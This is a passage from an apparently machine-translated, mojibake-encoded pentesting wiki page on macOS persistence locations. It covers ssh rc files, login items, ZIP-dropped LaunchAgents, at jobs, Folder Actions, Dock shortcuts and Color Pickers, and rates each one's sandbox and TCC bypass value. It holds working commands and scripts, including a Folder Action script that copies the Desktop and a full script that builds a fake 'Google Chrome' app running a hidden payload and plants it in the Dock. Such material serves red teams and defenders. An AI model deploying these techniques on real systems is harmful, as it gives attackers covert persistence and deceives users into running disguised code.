<p>å†™ä½œ: <a href="https://theevilbit.github.io/beyond/beyond_0006/">https://theevilbit.github.io/beyond/beyond_0006/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†éœ€è¦å¯ç”¨å’Œä½¿ç”¨ssh</li>
<li>TCCç»•è¿‡: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>SSHä½¿ç”¨éœ€è¦FDAè®¿é—®</li>
</ul>
<h4 id="ä½ç½®-11"><a class="header" href="#ä½ç½®-11">ä½ç½®</a></h4>
<ul>
<li><strong><code>~/.ssh/rc</code></strong></li>
<li><strong>è§¦å‘å™¨</strong>: é€šè¿‡sshç™»å½•</li>
<li><strong><code>/etc/ssh/sshrc</code></strong></li>
<li>éœ€è¦rootæƒé™</li>
<li><strong>è§¦å‘å™¨</strong>: é€šè¿‡sshç™»å½•</li>
</ul>
<p>{% hint style="danger" %}
å¯ç”¨sshéœ€è¦å®Œå…¨ç£ç›˜è®¿é—®:</p>
<pre><code class="language-bash">sudo systemsetup -setremotelogin on
</code></pre>
<p>{% endhint %}</p>
<h4 id="æè¿°ä¸åˆ©ç”¨-6"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-6">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œé™¤éåœ¨ <code>/etc/ssh/sshd_config</code> ä¸­è®¾ç½® <code>PermitUserRC no</code>ï¼Œå½“ç”¨æˆ· <strong>é€šè¿‡ SSH ç™»å½•</strong> æ—¶ï¼Œè„šæœ¬ <strong><code>/etc/ssh/sshrc</code></strong> å’Œ <strong><code>~/.ssh/rc</code></strong> å°†è¢«æ‰§è¡Œã€‚</p>
<h3 id="ç™»å½•é¡¹"><a class="header" href="#ç™»å½•é¡¹"><strong>ç™»å½•é¡¹</strong></a></h3>
<p>å†™ä½œ: <a href="https://theevilbit.github.io/beyond/beyond_0003/">https://theevilbit.github.io/beyond/beyond_0003/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†ä½ éœ€è¦å¸¦å‚æ•°æ‰§è¡Œ <code>osascript</code></li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-12"><a class="header" href="#ä½ç½®-12">ä½ç½®</a></h4>
<ul>
<li><strong><code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent</code></strong></li>
<li><strong>è§¦å‘:</strong> ç™»å½•</li>
<li>åˆ©ç”¨æœ‰æ•ˆè½½è·å­˜å‚¨è°ƒç”¨ <strong><code>osascript</code></strong></li>
<li><strong><code>/var/db/com.apple.xpc.launchd/loginitems.501.plist</code></strong></li>
<li><strong>è§¦å‘:</strong> ç™»å½•</li>
<li>éœ€è¦ root æƒé™</li>
</ul>
<h4 id="æè¿°-2"><a class="header" href="#æè¿°-2">æè¿°</a></h4>
<p>åœ¨ç³»ç»Ÿåå¥½è®¾ç½® -&gt; ç”¨æˆ·ä¸ç¾¤ç»„ -&gt; <strong>ç™»å½•é¡¹</strong> ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ° <strong>ç”¨æˆ·ç™»å½•æ—¶è¦æ‰§è¡Œçš„é¡¹ç›®</strong>ã€‚<br />
å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œåˆ—å‡ºã€æ·»åŠ å’Œåˆ é™¤å®ƒä»¬:</p>
<pre><code class="language-bash">#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
</code></pre>
<p>è¿™äº›é¡¹ç›®å­˜å‚¨åœ¨æ–‡ä»¶ <strong><code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent</code></strong></p>
<p><strong>ç™»å½•é¡¹</strong> ä¹Ÿå¯ä»¥é€šè¿‡ API <a href="https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc">SMLoginItemSetEnabled</a> æŒ‡ç¤ºï¼Œè¯¥é…ç½®å°†å­˜å‚¨åœ¨ <strong><code>/var/db/com.apple.xpc.launchd/loginitems.501.plist</code></strong></p>
<h3 id="zip-ä½œä¸ºç™»å½•é¡¹"><a class="header" href="#zip-ä½œä¸ºç™»å½•é¡¹">ZIP ä½œä¸ºç™»å½•é¡¹</a></h3>
<p>ï¼ˆæŸ¥çœ‹å…³äºç™»å½•é¡¹çš„å‰ä¸€éƒ¨åˆ†ï¼Œè¿™æ˜¯ä¸€ä¸ªæ‰©å±•ï¼‰</p>
<p>å¦‚æœå°† <strong>ZIP</strong> æ–‡ä»¶å­˜å‚¨ä¸º <strong>ç™»å½•é¡¹</strong>ï¼Œåˆ™ <strong><code>å½’æ¡£å®ç”¨å·¥å…·</code></strong> å°†æ‰“å¼€å®ƒï¼Œå¦‚æœè¯¥ zip ä¾‹å¦‚å­˜å‚¨åœ¨ <strong><code>~/Library</code></strong> ä¸­å¹¶åŒ…å«æ–‡ä»¶å¤¹ <strong><code>LaunchAgents/file.plist</code></strong> åŠåé—¨ï¼Œåˆ™è¯¥æ–‡ä»¶å¤¹å°†è¢«åˆ›å»ºï¼ˆé»˜è®¤æƒ…å†µä¸‹å¹¶ä¸å­˜åœ¨ï¼‰ï¼Œplist å°†è¢«æ·»åŠ ï¼Œå› æ­¤ä¸‹æ¬¡ç”¨æˆ·å†æ¬¡ç™»å½•æ—¶ï¼Œ<strong>plist ä¸­æŒ‡ç¤ºçš„åé—¨å°†è¢«æ‰§è¡Œ</strong>ã€‚</p>
<p>å¦ä¸€ç§é€‰æ‹©æ˜¯åœ¨ç”¨æˆ· HOME ä¸­åˆ›å»ºæ–‡ä»¶ <strong><code>.bash_profile</code></strong> å’Œ <strong><code>.zshenv</code></strong>ï¼Œè¿™æ ·å¦‚æœæ–‡ä»¶å¤¹ LaunchAgents å·²ç»å­˜åœ¨ï¼Œè¿™ç§æŠ€æœ¯ä»ç„¶æœ‰æ•ˆã€‚</p>
<h3 id="at"><a class="header" href="#at">At</a></h3>
<p>å†™ä½œï¼š <a href="https://theevilbit.github.io/beyond/beyond_0014/">https://theevilbit.github.io/beyond/beyond_0014/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’ï¼š <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†ä½ éœ€è¦ <strong>æ‰§è¡Œ</strong> <strong><code>at</code></strong> å¹¶ä¸”å®ƒå¿…é¡»æ˜¯ <strong>å¯ç”¨çš„</strong></li>
<li>TCC ç»•è¿‡ï¼š <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-13"><a class="header" href="#ä½ç½®-13">ä½ç½®</a></h4>
<ul>
<li>éœ€è¦ <strong>æ‰§è¡Œ</strong> <strong><code>at</code></strong> å¹¶ä¸”å®ƒå¿…é¡»æ˜¯ <strong>å¯ç”¨çš„</strong></li>
</ul>
<h4 id="æè¿°-3"><a class="header" href="#æè¿°-3"><strong>æè¿°</strong></a></h4>
<p><code>at</code> ä»»åŠ¡æ—¨åœ¨ <strong>è°ƒåº¦ä¸€æ¬¡æ€§ä»»åŠ¡</strong> åœ¨ç‰¹å®šæ—¶é—´æ‰§è¡Œã€‚ä¸ cron ä½œä¸šä¸åŒï¼Œ<code>at</code> ä»»åŠ¡åœ¨æ‰§è¡Œåä¼šè‡ªåŠ¨åˆ é™¤ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›ä»»åŠ¡åœ¨ç³»ç»Ÿé‡å¯åæ˜¯æŒä¹…çš„ï¼Œåœ¨æŸäº›æ¡ä»¶ä¸‹å°†å…¶æ ‡è®°ä¸ºæ½œåœ¨çš„å®‰å…¨éšæ‚£ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä»¬æ˜¯ <strong>ç¦ç”¨çš„</strong>ï¼Œä½† <strong>root</strong> ç”¨æˆ·å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ <strong>å¯ç”¨</strong> <strong>å®ƒä»¬</strong>ï¼š</p>
<pre><code class="language-bash">sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
</code></pre>
<p>è¿™å°†åœ¨1å°æ—¶å†…åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š</p>
<pre><code class="language-bash">echo "echo 11 &gt; /tmp/at.txt" | at now+1
</code></pre>
<p>æ£€æŸ¥ä½œä¸šé˜Ÿåˆ—ä½¿ç”¨ <code>atq:</code></p>
<pre><code class="language-shell-session">sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
</code></pre>
<p>ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªå·²è°ƒåº¦çš„ä»»åŠ¡ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>at -c JOBNUMBER</code> æ‰“å°ä»»åŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚</p>
<pre><code class="language-shell-session">sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' &gt;&amp;2
exit 1
}
unset OLDPWD
echo 11 &gt; /tmp/at.txt
</code></pre>
<p>{% hint style="warning" %}
å¦‚æœ AT ä»»åŠ¡æœªå¯ç”¨ï¼Œåˆ™åˆ›å»ºçš„ä»»åŠ¡å°†ä¸ä¼šè¢«æ‰§è¡Œã€‚
{% endhint %}</p>
<p><strong>ä½œä¸šæ–‡ä»¶</strong>å¯ä»¥åœ¨ <code>/private/var/at/jobs/</code> æ‰¾åˆ°ã€‚</p>
<pre><code>sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
</code></pre>
<p>æ–‡ä»¶ååŒ…å«é˜Ÿåˆ—ã€ä½œä¸šç¼–å·å’Œè®¡åˆ’è¿è¡Œçš„æ—¶é—´ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ <code>a0001a019bdcd2</code>ã€‚</p>
<ul>
<li><code>a</code> - è¿™æ˜¯é˜Ÿåˆ—</li>
<li><code>0001a</code> - åå…­è¿›åˆ¶çš„ä½œä¸šç¼–å·ï¼Œ<code>0x1a = 26</code></li>
<li><code>019bdcd2</code> - åå…­è¿›åˆ¶çš„æ—¶é—´ã€‚å®ƒè¡¨ç¤ºè‡ªçºªå…ƒä»¥æ¥ç»è¿‡çš„åˆ†é’Ÿæ•°ã€‚<code>0x019bdcd2</code> åœ¨åè¿›åˆ¶ä¸­æ˜¯ <code>26991826</code>ã€‚å¦‚æœæˆ‘ä»¬å°†å…¶ä¹˜ä»¥ 60ï¼Œæˆ‘ä»¬å¾—åˆ° <code>1619509560</code>ï¼Œå³ <code>GMT: 2021. April 27., Tuesday 7:46:00</code>ã€‚</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬æ‰“å°ä½œä¸šæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°å®ƒåŒ…å«äº†æˆ‘ä»¬ä½¿ç”¨ <code>at -c</code> è·å¾—çš„ç›¸åŒä¿¡æ¯ã€‚</p>
<h3 id="æ–‡ä»¶å¤¹æ“ä½œ"><a class="header" href="#æ–‡ä»¶å¤¹æ“ä½œ">æ–‡ä»¶å¤¹æ“ä½œ</a></h3>
<p>å†™ä½œ: <a href="https://theevilbit.github.io/beyond/beyond_0024/">https://theevilbit.github.io/beyond/beyond_0024/</a><br />
å†™ä½œ: <a href="https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d">https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†ä½ éœ€è¦èƒ½å¤Ÿå¸¦å‚æ•°è°ƒç”¨ <code>osascript</code> æ¥è”ç³» <strong><code>System Events</code></strong> ä»¥é…ç½®æ–‡ä»¶å¤¹æ“ä½œ</li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>å®ƒå…·æœ‰ä¸€äº›åŸºæœ¬çš„ TCC æƒé™ï¼Œå¦‚æ¡Œé¢ã€æ–‡æ¡£å’Œä¸‹è½½</li>
</ul>
<h4 id="ä½ç½®-14"><a class="header" href="#ä½ç½®-14">ä½ç½®</a></h4>
<ul>
<li><strong><code>/Library/Scripts/Folder Action Scripts</code></strong></li>
<li>éœ€è¦ root æƒé™</li>
<li><strong>è§¦å‘</strong>: è®¿é—®æŒ‡å®šæ–‡ä»¶å¤¹</li>
<li><strong><code>~/Library/Scripts/Folder Action Scripts</code></strong></li>
<li><strong>è§¦å‘</strong>: è®¿é—®æŒ‡å®šæ–‡ä»¶å¤¹</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-7"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-7">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>æ–‡ä»¶å¤¹æ“ä½œæ˜¯ç”±æ–‡ä»¶å¤¹ä¸­çš„å˜åŒ–è‡ªåŠ¨è§¦å‘çš„è„šæœ¬ï¼Œä¾‹å¦‚æ·»åŠ ã€åˆ é™¤é¡¹ç›®æˆ–å…¶ä»–æ“ä½œï¼Œå¦‚æ‰“å¼€æˆ–è°ƒæ•´æ–‡ä»¶å¤¹çª—å£çš„å¤§å°ã€‚è¿™äº›æ“ä½œå¯ä»¥ç”¨äºå„ç§ä»»åŠ¡ï¼Œå¹¶å¯ä»¥é€šè¿‡ä¸åŒçš„æ–¹å¼è§¦å‘ï¼Œä¾‹å¦‚ä½¿ç”¨ Finder ç•Œé¢æˆ–ç»ˆç«¯å‘½ä»¤ã€‚</p>
<p>è¦è®¾ç½®æ–‡ä»¶å¤¹æ“ä½œï¼Œä½ å¯ä»¥é€‰æ‹©ï¼š</p>
<ol>
<li>ä½¿ç”¨ <a href="https://support.apple.com/guide/automator/welcome/mac">Automator</a> åˆ›å»ºæ–‡ä»¶å¤¹æ“ä½œå·¥ä½œæµå¹¶å°†å…¶å®‰è£…ä¸ºæœåŠ¡ã€‚</li>
<li>é€šè¿‡æ–‡ä»¶å¤¹çš„ä¸Šä¸‹æ–‡èœå•ä¸­çš„æ–‡ä»¶å¤¹æ“ä½œè®¾ç½®æ‰‹åŠ¨é™„åŠ è„šæœ¬ã€‚</li>
<li>åˆ©ç”¨ OSAScript å‘ <code>System Events.app</code> å‘é€ Apple Event æ¶ˆæ¯ï¼Œä»¥ç¼–ç¨‹æ–¹å¼è®¾ç½®æ–‡ä»¶å¤¹æ“ä½œã€‚</li>
</ol>
<ul>
<li>è¿™ç§æ–¹æ³•ç‰¹åˆ«é€‚åˆå°†æ“ä½œåµŒå…¥ç³»ç»Ÿï¼Œæä¾›ä¸€å®šç¨‹åº¦çš„æŒä¹…æ€§ã€‚</li>
</ul>
<p>ä»¥ä¸‹è„šæœ¬æ˜¯æ–‡ä»¶å¤¹æ“ä½œå¯ä»¥æ‰§è¡Œçš„ç¤ºä¾‹ï¼š</p>
<pre><code class="language-applescript">// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
</code></pre>
<p>è¦ä½¿ä¸Šè¿°è„šæœ¬å¯ç”¨äºæ–‡ä»¶å¤¹æ“ä½œï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¼–è¯‘å®ƒï¼š</p>
<pre><code class="language-bash">osacompile -l JavaScript -o folder.scpt source.js
</code></pre>
<p>åœ¨è„šæœ¬ç¼–è¯‘åï¼Œé€šè¿‡æ‰§è¡Œä»¥ä¸‹è„šæœ¬æ¥è®¾ç½®æ–‡ä»¶å¤¹æ“ä½œã€‚æ­¤è„šæœ¬å°†å…¨å±€å¯ç”¨æ–‡ä»¶å¤¹æ“ä½œï¼Œå¹¶å°†ä¹‹å‰ç¼–è¯‘çš„è„šæœ¬ç‰¹å®šåœ°é™„åŠ åˆ°æ¡Œé¢æ–‡ä»¶å¤¹ã€‚</p>
<pre><code class="language-javascript">// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
</code></pre>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œè®¾ç½®è„šæœ¬ï¼š</p>
<pre><code class="language-bash">osascript -l JavaScript /Users/username/attach.scpt
</code></pre>
<ul>
<li>è¿™æ˜¯é€šè¿‡GUIå®ç°è¿™ç§æŒä¹…æ€§çš„æ–¹å¼ï¼š</li>
</ul>
<p>è¿™æ˜¯å°†è¦æ‰§è¡Œçš„è„šæœ¬ï¼š</p>
<p>{% code title="source.js" %}</p>
<pre><code class="language-applescript">var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
</code></pre>
<p>{% endcode %}</p>
<p>ç¼–è¯‘å®ƒï¼š <code>osacompile -l JavaScript -o folder.scpt source.js</code></p>
<p>ç§»åŠ¨åˆ°ï¼š</p>
<pre><code class="language-bash">mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
</code></pre>
<p>ç„¶åï¼Œæ‰“å¼€ <code>Folder Actions Setup</code> åº”ç”¨ï¼Œé€‰æ‹© <strong>æ‚¨æƒ³è¦ç›‘è§†çš„æ–‡ä»¶å¤¹</strong>ï¼Œå¹¶åœ¨æ‚¨çš„æƒ…å†µä¸‹é€‰æ‹© <strong><code>folder.scpt</code></strong>ï¼ˆåœ¨æˆ‘çš„æƒ…å†µä¸‹æˆ‘ç§°å®ƒä¸º output2.scpï¼‰ï¼š</p>
<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>
<p>ç°åœ¨ï¼Œå¦‚æœæ‚¨ä½¿ç”¨ <strong>Finder</strong> æ‰“å¼€è¯¥æ–‡ä»¶å¤¹ï¼Œæ‚¨çš„è„šæœ¬å°†è¢«æ‰§è¡Œã€‚</p>
<p>æ­¤é…ç½®å­˜å‚¨åœ¨ <strong>plist</strong> ä¸­ï¼Œä½äº <strong><code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code></strong> çš„ base64 æ ¼å¼ã€‚</p>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬å°è¯•åœ¨æ²¡æœ‰ GUI è®¿é—®çš„æƒ…å†µä¸‹å‡†å¤‡è¿™ä¸ªæŒä¹…æ€§ï¼š</p>
<ol>
<li><strong>å°† <code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code></strong> å¤åˆ¶åˆ° <code>/tmp</code> ä»¥å¤‡ä»½ï¼š</li>
</ol>
<ul>
<li><code>cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp</code></li>
</ul>
<ol start="2">
<li><strong>ç§»é™¤</strong> æ‚¨åˆšåˆšè®¾ç½®çš„æ–‡ä»¶å¤¹æ“ä½œï¼š</li>
</ol>
<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
<p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªç©ºç¯å¢ƒ</p>
<ol start="3">
<li>å¤åˆ¶å¤‡ä»½æ–‡ä»¶ï¼š<code>cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/</code></li>
<li>æ‰“å¼€ Folder Actions Setup.app ä»¥ä½¿ç”¨æ­¤é…ç½®ï¼š<code>open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"</code></li>
</ol>
<p>{% hint style="danger" %}
è¿™å¯¹æˆ‘æ²¡æœ‰ç”¨ï¼Œä½†è¿™äº›æ˜¯å†™ä½œä¸­çš„è¯´æ˜ï¼š(
{% endhint %}</p>
<h3 id="dock-å¿«æ·æ–¹å¼"><a class="header" href="#dock-å¿«æ·æ–¹å¼">Dock å¿«æ·æ–¹å¼</a></h3>
<p>å†™ä½œï¼š<a href="https://theevilbit.github.io/beyond/beyond_0027/">https://theevilbit.github.io/beyond/beyond_0027/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’ï¼š<a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†æ‚¨éœ€è¦åœ¨ç³»ç»Ÿä¸­å®‰è£…æ¶æ„åº”ç”¨ç¨‹åº</li>
<li>TCC ç»•è¿‡ï¼š<a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-15"><a class="header" href="#ä½ç½®-15">ä½ç½®</a></h4>
<ul>
<li><code>~/Library/Preferences/com.apple.dock.plist</code></li>
<li><strong>è§¦å‘</strong>ï¼šå½“ç”¨æˆ·ç‚¹å‡» Dock ä¸­çš„åº”ç”¨ç¨‹åºæ—¶</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-8"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-8">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>æ‰€æœ‰å‡ºç°åœ¨ Dock ä¸­çš„åº”ç”¨ç¨‹åºéƒ½åœ¨ plist ä¸­æŒ‡å®šï¼š<strong><code>~/Library/Preferences/com.apple.dock.plist</code></strong></p>
<p>åªéœ€ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ <strong>æ·»åŠ åº”ç”¨ç¨‹åº</strong>ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '&lt;dict&gt;&lt;key&gt;tile-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;file-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;_CFURLString&lt;/key&gt;&lt;string&gt;/System/Applications/Books.app&lt;/string&gt;&lt;key&gt;_CFURLStringType&lt;/key&gt;&lt;integer&gt;0&lt;/integer&gt;&lt;/dict&gt;&lt;/dict&gt;&lt;/dict&gt;'

# Restart Dock
killall Dock
</code></pre>
<p>{% endcode %}</p>
<p>é€šè¿‡ä¸€äº›<strong>ç¤¾ä¼šå·¥ç¨‹</strong>ï¼Œä½ å¯ä»¥åœ¨ dock ä¸­<strong>ä¼ªè£…æˆä¾‹å¦‚ Google Chrome</strong>ï¼Œå¹¶å®é™…æ‰§è¡Œä½ è‡ªå·±çš„è„šæœ¬ï¼š</p>
<pre><code class="language-bash">#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2&gt;/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &amp;
touch /tmp/ImGoogleChrome' &gt; /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat &lt;&lt; EOF &gt; /tmp/Google\ Chrome.app/Contents/Info.plist
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;CFBundleExecutable&lt;/key&gt;
&lt;string&gt;Google Chrome&lt;/string&gt;
&lt;key&gt;CFBundleIdentifier&lt;/key&gt;
&lt;string&gt;com.google.Chrome&lt;/string&gt;
&lt;key&gt;CFBundleName&lt;/key&gt;
&lt;string&gt;Google Chrome&lt;/string&gt;
&lt;key&gt;CFBundleVersion&lt;/key&gt;
&lt;string&gt;1.0&lt;/string&gt;
&lt;key&gt;CFBundleShortVersionString&lt;/key&gt;
&lt;string&gt;1.0&lt;/string&gt;
&lt;key&gt;CFBundleInfoDictionaryVersion&lt;/key&gt;
&lt;string&gt;6.0&lt;/string&gt;
&lt;key&gt;CFBundlePackageType&lt;/key&gt;
&lt;string&gt;APPL&lt;/string&gt;
&lt;key&gt;CFBundleIconFile&lt;/key&gt;
&lt;string&gt;app&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '&lt;dict&gt;&lt;key&gt;tile-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;file-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;_CFURLString&lt;/key&gt;&lt;string&gt;/tmp/Google Chrome.app&lt;/string&gt;&lt;key&gt;_CFURLStringType&lt;/key&gt;&lt;integer&gt;0&lt;/integer&gt;&lt;/dict&gt;&lt;/dict&gt;&lt;/dict&gt;'
killall Dock
</code></pre>
<h3 id="é¢œè‰²é€‰æ‹©å™¨"><a class="header" href="#é¢œè‰²é€‰æ‹©å™¨">é¢œè‰²é€‰æ‹©å™¨</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0017/">https://theevilbit.github.io/beyond/beyond_0017</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>éœ€è¦å‘ç”Ÿä¸€ä¸ªéå¸¸ç‰¹å®šçš„åŠ¨ä½œ</li>
<li>ä½ å°†è¿›å…¥å¦ä¸€ä¸ªæ²™ç›’</li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-16"><a class="header" href="#ä½ç½®-16">ä½ç½®</a></h4>
<ul>
<li><code>/Library/ColorPickers</code></li>
<li>éœ€è¦ root æƒé™</li>
<li>è§¦å‘: ä½¿ç”¨é¢œè‰²é€‰æ‹©å™¨</li>
<li><code>~/Library/ColorPickers</code></li>
<li>è§¦å‘: ä½¿ç”¨é¢œè‰²é€‰æ‹©å™¨</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-9"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-9">æè¿°ä¸åˆ©ç”¨</a></h4>
<p><strong>ç¼–è¯‘ä¸€ä¸ªé¢œè‰²é€‰æ‹©å™¨</strong> åŒ…å«ä½ çš„ä»£ç ï¼ˆä½ å¯ä»¥ä½¿ç”¨ <a href="https://github.com/viktorstrate/color-picker-plus"><strong>è¿™ä¸ªä¾‹å­</strong></a>ï¼‰å¹¶æ·»åŠ ä¸€ä¸ªæ„é€ å‡½æ•°ï¼ˆå¦‚åœ¨ <a href="macos-auto-start-locations.html#screen-saver">å±å¹•ä¿æŠ¤ç¨‹åºéƒ¨åˆ†</a> ä¸­ï¼‰å¹¶å°†åŒ…å¤åˆ¶åˆ° <code>~/Library/ColorPickers</code>ã€‚</p>
<p>ç„¶åï¼Œå½“é¢œè‰²é€‰æ‹©å™¨è¢«è§¦å‘æ—¶ï¼Œä½ çš„ä»£ç ä¹Ÿåº”è¯¥è¢«è§¦å‘ã€‚</p>
<p>è¯·æ³¨æ„ï¼ŒåŠ è½½ä½ çš„åº“çš„äºŒè¿›åˆ¶æ–‡ä»¶æœ‰ä¸€ä¸ª <strong>éå¸¸ä¸¥æ ¼çš„æ²™ç›’</strong>: <code>/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64</code></p>
<pre><code class="language-bash">[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
